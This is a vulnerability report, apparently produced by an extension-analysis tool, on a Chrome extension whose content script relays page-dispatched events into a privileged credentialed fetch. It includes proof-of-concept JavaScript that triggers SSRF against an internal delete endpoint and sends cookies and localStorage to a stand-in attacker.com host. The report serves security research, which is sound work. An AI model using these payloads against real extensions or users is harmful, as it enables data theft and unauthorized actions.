# CoCo Analysis: omohfhadnbkakganodaofplinheljnbd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_request → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/omohfhadnbkakganodaofplinheljnbd/opgen_generated_files/cs_0.js
Line 479: `document.addEventListener('request', function (e) {`
Line 480: `var params = e.detail;`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/omohfhadnbkakganodaofplinheljnbd/opgen_generated_files/bg.js
Line 1057: `fetch(req.url,{`

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 479-503)
document.addEventListener('request', function (e) {
    var params = e.detail;  // ← attacker-controlled
    var chromeVersion = /Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1];

    if (parseInt(chromeVersion) > 73) {
        // Data validation for file uploads (checks size but not URL)
        if(params.data && params.data instanceof Array){
            let errData = params.data.filter(item=>{
                if(item.type ==='file' && item.value && item.value.size > 10*1024*1024){
                    return true
                }
            })
            if(errData && errData.length>0){
                document.dispatchEvent(new CustomEvent('result.error', {detail: {
                    status:500,statusText:'request-cancel',responseText:'跨域上传文件超过100KB'
                }}));
                return true;
            }
        }
        chrome.runtime.sendMessage(
            params,  // ← forwards attacker-controlled data to background
            function (rs) {
                document.dispatchEvent(new CustomEvent(rs.event, {detail: rs.data}));
            });
        return true;
    }
});

// Background script - Message handler (bg.js Line 1057-1079)
chrome.runtime.onMessage.addListener(function(req, sender, sendResponse) {
    // req contains attacker-controlled data from content script
    var body;
    if(req.data instanceof FormData || req.data instanceof ArrayBuffer){
        // ... body processing
        body = req.data;
    }

    fetch(req.url,{  // ← attacker-controlled URL
        method:req.type,  // ← attacker-controlled method
        headers:req.headers,  // ← attacker-controlled headers
        body:body,  // ← attacker-controlled body
        mode:'cors',
        credentials:'include',
        cache:'no-cache',
        redirect:'follow'
    }).then(rs=>{
        return new Promise((resolve,rej)=>{
            let x = {
                status:rs.status,
                statusText:rs.statusText,
                headers:rs.headers
            }
            rs.text().then(text=>{
                x.responseText = text
                resolve(x)
            })
        })
    }).then(function(resp){
        sendResponse({
            event: 'result.complete',
            data: resp
        });
    }).catch(function(error){
        sendResponse({
            event: 'result.error',
            data: error
        });
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener in content script

**Attack:**

```javascript
// Malicious webpage can dispatch custom event to trigger SSRF
document.dispatchEvent(new CustomEvent('request', {
    detail: {
        url: 'http://internal-server/admin/delete',  // Internal network target
        type: 'POST',
        headers: {
            'Authorization': 'Bearer stolen_token',
            'Content-Type': 'application/json'
        },
        data: JSON.stringify({action: 'delete_all'})
    }
}));

// Or exfiltrate data
document.dispatchEvent(new CustomEvent('request', {
    detail: {
        url: 'https://attacker.com/exfil',
        type: 'POST',
        headers: {'Content-Type': 'application/json'},
        data: JSON.stringify({
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage)
        })
    }
}));
```

**Impact:** Attacker achieves privileged SSRF with full control over URL, method, headers, and body. Extension has host_permissions for "*://*/*" allowing requests to any domain including internal networks. Attacker can bypass CORS, access internal services, exfiltrate sensitive data with user's credentials (credentials:'include'), or perform authenticated actions on behalf of the user to any internal or external service.
